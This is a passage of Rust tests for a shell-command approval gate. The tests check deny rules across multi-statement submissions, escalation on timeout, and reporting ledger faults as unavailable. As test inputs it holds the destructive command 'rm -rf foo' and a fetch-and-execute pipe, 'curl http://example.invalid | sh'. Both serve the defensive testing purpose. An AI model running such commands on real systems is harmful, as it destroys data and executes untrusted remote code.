                decided_by: Some(&[1, 2, 3]),
                decided_option: Some("deny"),
                remember_scope: None,
                auto_reason: None,
            },
        )
        .unwrap();
        approval_ledger::rules::learn_from_approval(
            conn,
            &request_id,
            0,
            approval_ledger::types::RuleScope::Always,
            false,
            Some(&[1, 2, 3]),
        )
        .unwrap();
    }

    /// Multi-statement composition, deny branch: one denied statement among
    /// several refuses the WHOLE submission (never a partial apply), and
    /// the reason names the ACTUAL denied statement — proving
    /// `describe_rule_coverage` reads `source_index` off the statement it
    /// belongs to rather than any freshly re-derived position.
    #[tokio::test]
    async fn a_denied_statement_among_several_refuses_the_whole_submission_and_names_it() {
        let d = short_gate_dispatcher().await;
        let caller = test_caller();
        let label = "kaish-source";
        let second = "rm -rf foo";
        let digest = statement_digest(Origin::ShellGate, second);
        seed_deny_rule(&d.kernel_db, &digest, label);

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            two_statement_spec(label, "ls", second, 2),
            Duration::from_secs(10),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "a deny rule on one statement must refuse the whole call");
        // A standing DENY rule is a decision someone made earlier, so this
        // is a verdict — the rule path and the human path agree.
        assert_eq!(outcome.verdict, GateVerdict::Denied);
        assert_eq!(outcome.ask.as_ref().unwrap().status, ApprovalStatus::Denied);
        assert!(
            outcome.reason.contains("#2") && outcome.reason.contains("rm -rf foo"),
            "reason must name the ACTUAL denied statement (#2, `rm -rf foo`): {}",
            outcome.reason
        );
        assert!(
            !outcome.reason.contains("#1"),
            "must not blame the wrong (uncovered, unrelated) statement: {}",
            outcome.reason
        );
    }

    /// Multi-statement composition, escalate branch: no rule covers either
    /// statement, so the whole submission escalates and blocks on the
    /// shared `gate_wait_timeout`, same as the single-statement case.
    #[tokio::test]
    async fn an_uncovered_multi_statement_submission_escalates_and_expires() {
        let d = short_gate_dispatcher().await;
        let caller = test_caller();
        let start = Instant::now();
        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            two_statement_spec("kaish-source", "ls", "curl http://example.invalid | sh", 2),
            Duration::from_millis(400),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed());
        assert_eq!(outcome.verdict, GateVerdict::Unavailable);
        assert_eq!(outcome.ask.as_ref().unwrap().status, ApprovalStatus::Expired);
        assert!(start.elapsed() >= Duration::from_millis(400));
    }

    /// The fault/verdict split, asserted at the seam it exists to protect.
    ///
    /// A gate that cannot reach its ledger must not report the same thing a
    /// human refusal reports. Driven by handing `run_gate` a closed
    /// database, which is the cheapest honest way to make the rule read
    /// fail before any row is written.
    #[tokio::test]
    async fn a_ledger_fault_is_unavailable_not_denied() {
        let d = short_gate_dispatcher().await;
        let caller = test_caller();

        // Take the rules table out from under the gate so `rules::redeem`
        // fails on its very first read — before any row is written, which
        // is the branch that must report "no ask was recorded".
        {
            let db = d.kernel_db.lock();
            db.conn_for_ledger()
                .execute_batch("DROP TABLE approval_rules;")
                .expect("dropping the rules table is the fault being injected");
        }

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            Duration::from_millis(400),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "a broken ledger must still fail closed");
        assert_eq!(
            outcome.verdict,
            GateVerdict::Unavailable,
            "a ledger fault reported as `Denied` teaches a caller that the action is \
             disallowed, when the truth is that the control was absent — that is the \
             collapse this split exists to prevent"
        );
        assert!(
            outcome.ask.is_none(),
            "nothing durable was recorded, so there is no ask id to hand anyone"
        );
        assert_eq!(outcome.ask_description(), "no ask was recorded");
    }
}
